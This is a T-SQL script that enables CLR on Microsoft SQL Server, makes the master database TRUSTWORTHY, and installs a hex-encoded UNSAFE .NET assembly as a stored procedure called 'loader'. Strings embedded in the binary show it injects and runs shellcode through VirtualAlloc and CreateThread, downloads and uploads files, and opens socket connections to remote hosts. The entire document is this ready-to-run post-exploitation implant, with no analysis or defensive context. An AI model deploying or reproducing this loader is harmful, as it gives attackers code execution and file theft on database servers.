EXEC sp_configure 'clr enabled', 1; RECONFIGURE;
ALTER DATABASE master SET TRUSTWORTHY ON;
CREATE ASSEMBLY [MSSQL_Loader] AUTHORIZATION [dbo] FROM 0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000504500004C01030018217C640000000000000000E00022200B013000001200000006000000000000F2310000002000000040000000000010002000000002000004000000000000000400000000000000008000000002000000000000030040850000100000100000000010000010000000000000100000000000000000000000A03100004F00000000400000A802000000000000000000000000000000000000006000000C000000683000001C0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000080000000000000000000000082000004800000000000000000000002E74657874000000F8110000002000000012000000020000000000000000000000000000200000602E72737263000000A8020000004000000004000000140000000000000000000000000000400000402E72656C6F6300000C0000000060000000020000001800000000000000000000000000004000004200000000000000000000000000000000D43100000000000048000000020005006C240000FC0B000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001B3004008100000000000000027201000070280500000A2D29027205000070280500000A2D36027209000070280500000A2D3302720D000070280500000A2D3A2B45036F0600000A1001280700000A0328060000066F0800000A2B2B03040528030000062B21280700000A03040528040000066F0800000A2B0D73090000060304280500000626DE0326DE002A00000001100000000000007D7D000307000001133002000E00000001000011022C09021200280900000A2A162A00001B300500AB000000020000110228020000062C1E1603280A00000A2F0D03280A00000A20FFFF0000320804280B00000A2D012A18171C730C00000A0A02280D00000A03280A00000A730E00000A0B06076F0F00000ADE0326DE5C0419731000000A0C20000010008D190000010D151304080916098E696F1100000A130411048D19000001130509161105161104281200000A0611056F1300000A2611041630D0DE14082C06086F1400000ADC062C06066F1400000ADC2A0001280000000030001B4B000307000001020056004096000A000000000200300070A0000A000000001B300300850000000300001104281500000A0A281600000A0B07066F1700000A16281800000A72110000707E1900000A6F1A00000A6F1B00000A0C027201000070280500000A2C1208721500007003281C00000A281D00000A26027205000070280500000A2C070308281E00000A080DDE1D072C06076F1400000ADC062C06066F1400000ADC2672190000700DDE00092A0000000128000002000D005966000A00000000020007006970000A00000000000000007A7A0009070000011B300400B50000000400001103721B0000706F1F00000A2D02162A0004282000000A282100000A2604280B00000A2C0604282200000A732300000A0A03732400000A0B280700000A72250000706F0800000A0607046F2500000A2B0A20F4010000282600000A066F2700000A2DEE280700000A047209000070721900007028040000066F0800000A04280B00000A0CDE2E062C06066F1400000ADC0D280700000A72490000706F0800000A280700000A096F2800000A6F0800000A160CDE00082A000000011C0000020030005585000A00000000000010007F8F0024070000011B300600C000000005000011026F2900000A185D17331F7287000070026F2900000A0D1203282A00000A282B00000A1304DD93000000026F2900000A185B0A061F322F0972BD0000701304DE7C068D190000010B1613052B2B72DD000070021105185A186F2C00000A282B00000A1F10282D00000A13060711051106D29C11051758130511050632D016078E6920001000001F4028070000060C0716086E282E00000A078E69282F00000A16160816161628080000062672E30000701304DE096F3000000A1304DE0011042A0110000000000000B4B40009070000011E02283100000A2A42534A4201000100000000000C00000076322E302E35303732370000000005006C00000014040000237E000080040000E404000023537472696E67730000000064090000FC00000023555300600A0000100000002347554944000000700A00008C01000023426C6F620000000000000002000001471502140900000000FA01330016000001000000270000000200000009000000180000003100000004000000050000000100000002000000010000000300000000005E020100000000000600A00137030600C00137030600760105030F00570300000600F0037A020A008A01D502060094027A020E009E0309040E001404CF030E003104090406006F02460006002E006D040E00270409040E0052027A02060009027A020A005C04D5020A001801D502060016007A020600F90046000E008A04CF030E003E01CF030E002001CF030E00330409040600D20046000600DE017A02060073024600060067047A020600E7007A02060081026D040600C8027A020E009A0309040E00AD04090406002E0246000600A304460006009E0246000600B000F60106003C047A020600FE027A02060056021803000000003D00000000000100010001001000660300001500010001005020000000009600B5022D010100F0200000000096002100440005000C21000000009600F30035010600EC210000000096003200B1000900A822000000008600B7003C010C0088230000000096006500D4000E000000000080009120860042010F000000000080009120AA004A0113006424000000008618F80206001900000001004901000002000100000003000600000004001C0000000100B20200000100B203000002004404000003002A02000001004901000002001A02000003002A02000001006B0200000200330200000100930000000100A80300000200EF01000003002D0100000400FF0300000100770300000200E30100000300C00300000400BC02000005008A030000060096000900F80201001100F80206001900F8020A003100F80206007900D104100079008F02160081000F011A008900C5001F0041005F012900910062013F009900E20344004900F80249004100620153005100F80259004900F70360005900F8026600D100A5006D00D900980475004900C5008000E100570106009900A1008F00610068019500E9001E029A00F1000702A1007900DD04A8007900CA00AB007900F00216007900E903B100F900B904B80099004F04BF0079004702CF000901FE00D40011019D04D90099006F01E0006900F80206007100F8021F0069007400E5002101AC02EC006900C604F1003900DB00160079003C0200019100070216007900E9030401790010020A0129011400100131011B041601390198041B012900070216002900F80206002000230085012E000B0054012E0013005D012E001B007C01240031008600C500F5000B0000010F008600010000011100AA0001000480000000000000000000000000000000004E01000002000000000000000000000024015C0000000000020000000000000000000000240150000000000002000000000000000000000024017A0200000000000000617267300061726731006B65726E656C333200546F496E74333200617267320056616C696461746549507634004D44350067657446696C654D6435003C4D6F64756C653E0053797374656D2E494F0053797374656D2E44617461006D73636F726C6962007368656C6C636F64655F6578656300446F776E6C6F616446696C654173796E63005669727475616C416C6C6F63007363006C705468726561644964004F70656E5265616400437265617465546872656164005374617274446F776E6C6F61640053656E64005265706C6163650046696C654D6F6465006765745F4D6573736167650049446973706F7361626C650055706C6F616446696C65004765744469726563746F72794E616D65006765745F506970650053716C506970650050726F746F636F6C5479706500666C416C6C6F636174696F6E5479706500536F636B657454797065007479706500646174616261736500446973706F7365005472795061727365004372656174650044656C6574650044656275676761626C654174747269627574650053716C50726F63656475726541747472696275746500436F6D70696C6174696F6E52656C61786174696F6E734174747269627574650052756E74696D65436F6D7061746962696C6974794174747269627574650042797465006477537461636B53697A6500647753697A650053797374656D2E546872656164696E6700546F537472696E6700537562737472696E670061726700436F6D70757465486173680066696C6550617468007361766570617468006765745F4C656E677468005374617274735769746800557269004D61727368616C0064617461626173652E646C6C0075726C0046696C6553747265616D0053797374656D0048617368416C676F726974686D005472696D00457863657074696F6E004469726563746F7279496E666F00536C656570006970006C6F61646572006C70506172616D6574657200426974436F6E766572746572004D6963726F736F66742E53716C5365727665722E53657276657200546F4C6F776572002E63746F7200496E745074720053797374656D2E446961676E6F73746963730053797374656D2E52756E74696D652E496E7465726F7053657276696365730053797374656D2E52756E74696D652E436F6D70696C6572536572766963657300446562756767696E674D6F6465730053746F72656450726F63656475726573006C70546872656164417474726962757465730064774372656174696F6E466C61677300446E7300495041646472657373006C70416464726573730073657276657241646472657373006C705374617274416464726573730053797374656D2E4E65742E536F636B6574730045786973747300436F6E636174004F626A65637400436F6E6E65637400666C50726F746563740053797374656D2E4E657400536F636B6574006F705F4578706C6963697400576562436C69656E74004950456E64506F696E7400436F6E7665727400736572766572506F7274005772697465416C6C546578740053716C436F6E746578740041727261790053797374656D2E53656375726974792E43727970746F677261706879004164647265737346616D696C7900436F7079004372656174654469726563746F7279004950486F7374456E74727900476574486F7374456E747279006765745F497342757379006F705F457175616C69747900456D70747900000003300000033100000332000003330000032D0001032E00000100096800740074007000002344006F0077006E006C006F006100640069006E0067002000660069006C0065003A00003D57006100730020006E006F0074002000610062006C006500200074006F00200064006F0077006E006C006F00610064002000660069006C006500210000357300680065006C006C0063006F006400650020006C0065006E0067007400680020006900730020006500720072006F0072003A00001F7300680065006C006C0063006F006400650020006500720072006F0072000005300078000017720075006E00200073007500630063006500730073000000A3A9B0D5B28DE9428ABC10C461183D3C00042001010803200001052001011111050002020E0E0320000E0400001245042001010E0407011221070002020E1012210D070612251229122D1D05081D05040001080E040001020E0920030111511155115905000112210E0620020112210805200101125D062002010E1161072003081D0508080A000501126D08126D0808052001081D05080704122D12310E0E050001122D0E04000012310620011D0512690600020E1D050802060E0520020E0E0E0600030E0E0E0E0600011280810E050002010E0E0907041235123902121D042001020E0400010E0E06000112808D0E040001010E0620020112390E0400010108032000020A0707081D0509080E0808032000080500020E0E0E0520020E0808050002080E08040001180A080004011D0508180808B77A5C561934E089070004010E0E0E0E060003010E0E0E052002020E0E0700040909090909090006090909090909090801000800000000001E01000100540216577261704E6F6E457863657074696F6E5468726F777301080100020000000000040100000000000000000018217C6400000000020000001C0100008430000084120000525344539F2308FFBDBC7F42B13E44D5F750359E01000000433A5C55736572735C41646D696E6973747261746F725C736F757263655C7265706F735C64617461626173655C64617461626173655C6F626A5C52656C656173655C64617461626173652E7064620000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000C83100000000000000000000E2310000002000000000000000000000000000000000000000000000D4310000000000000000000000005F436F72446C6C4D61696E006D73636F7265652E646C6C0000000000FF25002000100000000000000000000000000000000000000000000001001000000018000080000000000000000000000000000001000100000030000080000000000000000000000000000001000000000048000000584000004C02000000000000000000004C0234000000560053005F00560045005200530049004F004E005F0049004E0046004F0000000000BD04EFFE00000100000000000000000000000000000000003F000000000000000400000002000000000000000000000000000000440000000100560061007200460069006C00650049006E0066006F00000000002400040000005400720061006E0073006C006100740069006F006E00000000000000B004AC010000010053007400720069006E006700460069006C00650049006E0066006F0000008801000001003000300030003000300034006200300000002C0002000100460069006C0065004400650073006300720069007000740069006F006E000000000020000000300008000100460069006C006500560065007200730069006F006E000000000030002E0030002E0030002E00300000003A000D00010049006E007400650072006E0061006C004E0061006D0065000000640061007400610062006100730065002E0064006C006C00000000002800020001004C006500670061006C0043006F00700079007200690067006800740000002000000042000D0001004F0072006900670069006E0061006C00460069006C0065006E0061006D0065000000640061007400610062006100730065002E0064006C006C0000000000340008000100500072006F006400750063007400560065007200730069006F006E00000030002E0030002E0030002E003000000038000800010041007300730065006D0062006C0079002000560065007200730069006F006E00000030002E0030002E0030002E0030000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000000C000000F43100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 WITH PERMISSION_SET = UNSAFE;
CREATE PROCEDURE [dbo].[loader] @type NVARCHAR (MAX),@arg0 NVARCHAR (MAX),@arg1 NVARCHAR (MAX),@agr2 NVARCHAR (MAX) AS EXTERNAL NAME [MSSQL_Loader].[StoredProcedures].[loader];